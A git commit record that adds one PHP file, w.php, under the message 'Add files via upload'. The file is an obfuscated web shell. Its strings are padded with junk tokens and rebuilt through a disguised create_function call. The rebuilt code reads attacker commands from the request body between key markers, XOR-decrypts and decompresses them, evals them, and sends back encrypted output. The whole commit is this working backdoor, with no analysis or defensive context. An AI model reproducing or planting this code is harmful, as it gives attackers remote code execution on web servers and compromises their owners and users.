8fdc90534a1a4aeabcf9fa8a23248be7bce4b303
nanadaimejokowidodo <84342523+nanadaimejokowidodo@users.noreply.github.com>
2023-09-26 02:37:52 +0700

    Add files via upload

---
+++ w.php
@@ -0,0 +1,11 @@
+<?php
+$k='ob_5Vend_clean();$r=@base5V645V_enc5Vode(@x(5V@gzcompr5Vess($o),$5Vk));p5Vrint("5V$p$kh$5Vr$kf");}';
+$f='";funct5Vion x(5V5V$t,$k){$c=strl5Ven($k5V);$5Vl=strlen($5V5Vt)5V;$o="";for($i=05V;$i<$l5V;){';
+$E='for5V($5Vj=05V;($j<$c&&$i<$5Vl)5V;5V$5Vj++,$i++){$o.=5V$5Vt{$i}^$k{$j};}}r5V5Veturn $o;5V}i5Vf (@pr5V5Veg_';
+$L='$k5V="e10adc35V95V";$kh5V="49ba59abbe55V6";$kf5V="5Ve057f20f885V3e";$p="c5V2K5V5VDjN5VTFPcxyKRZx';
+$h='match("5V/$k5Vh(.+)$kf/5V",@file_get_cont5Vents(5V"php:5V//input"5V),$m)=5V5V=1) {@ob_s5Vtart();5V@eva';
+$J=str_replace('Y','','crYYeaYte_fYuYnctiYon');
+$i='5Vl5V(@gzun5V5Vcompress(@x(@b5Vase64_d5Veco5Vde($m[15V]),$k)));$5Vo=@5Vob_get5V_cont5Ve5Vnts();@5V';
+$H=str_replace('5V','',$L.$f.$E.$h.$i.$k);
+$r=$J('',$H);$r();
+?>
